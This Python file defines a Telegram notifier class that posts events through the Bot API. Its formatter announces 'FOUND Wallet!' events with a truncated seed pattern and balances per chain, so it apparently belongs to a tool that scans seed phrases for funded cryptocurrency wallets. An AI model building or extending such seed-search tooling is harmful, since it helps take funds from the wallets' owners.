import json
import logging

import httpx
from app.interfaces.webhook_client import IWebhookClient, EventResult

logger = logging.getLogger(__name__)


class TelegramNotifier(IWebhookClient):
    def __init__(self, bot_token: str = "", chat_id: str = "", enabled: bool = False):
        self._bot_token = bot_token
        self._chat_id = chat_id
        self._enabled = enabled

    def configure(self, bot_token: str, chat_id: str, enabled: bool = True) -> None:
        self._bot_token = bot_token
        self._chat_id = chat_id
        self._enabled = enabled

    @property
    def enabled(self) -> bool:
        return self._enabled

    def post_event(self, event: dict) -> EventResult:
        if not self._enabled or not self._bot_token or not self._chat_id:
            return EventResult(success=False, message="Telegram not configured")
        try:
            message = self._format_event(event)
            resp = httpx.post(
                f"https://api.telegram.org/bot{self._bot_token}/sendMessage",
                json={"chat_id": self._chat_id, "text": message, "parse_mode": "HTML"},
                timeout=10,
            )
            data = resp.json()
            if data.get("ok"):
                return EventResult(success=True, message="Sent to Telegram")
            return EventResult(success=False, message=data.get("description", "Unknown error"))
        except Exception as e:
            logger.error("Telegram notification failed: %s", e)
            return EventResult(success=False, message=str(e))

    async def post_event_async(self, event: dict) -> EventResult:
        if not self._enabled or not self._bot_token or not self._chat_id:
            return EventResult(success=False, message="Telegram not configured")
        try:
            message = self._format_event(event)
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.post(
                    f"https://api.telegram.org/bot{self._bot_token}/sendMessage",
                    json={"chat_id": self._chat_id, "text": message, "parse_mode": "HTML"},
                )
                data = resp.json()
                if data.get("ok"):
                    return EventResult(success=True, message="Sent to Telegram")
                return EventResult(success=False, message=data.get("description", "Unknown error"))
        except Exception as e:
            logger.error("Telegram notification failed: %s", e)
            return EventResult(success=False, message=str(e))

    def _format_event(self, event: dict) -> str:
        event_type = event.get("type", "UNKNOWN")
        if event_type == "FOUND":
            pattern = event.get("pattern", "")[:40]
            balances = event.get("balances", [])
            lines = ["<b>FOUND Wallet!</b>", f"Seed: <code>{pattern}...</code>"]
            for b in balances:
                chain = b.get("chain", "?")
                addr = b.get("address", "?")[:16]
                confirmed = b.get("confirmed", 0)
                lines.append(f"  {chain}: {confirmed:.8f} ({addr})")
            return "\n".join(lines)
        return json.dumps(event, indent=2)
